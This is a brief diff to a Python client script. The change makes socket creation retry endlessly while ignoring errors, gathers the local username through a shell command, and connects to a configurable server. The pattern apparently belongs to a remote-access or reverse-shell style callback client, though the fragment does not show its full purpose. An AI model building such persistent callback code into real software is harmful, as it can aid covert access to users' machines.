@@ -8,9 +8,15 @@ server_port = 8080                # Replace with your server's port
 
 # Connect to the server
 while True:
+    try:
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        break
+    except:
+        pass
+
+while True:
     # Create a socket object
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    username = output = subprocess.getoutput("whoami")
+    username = subprocess.getoutput("""echo %username%""")
 
     try:
         client_socket.connect((server_address, server_port))
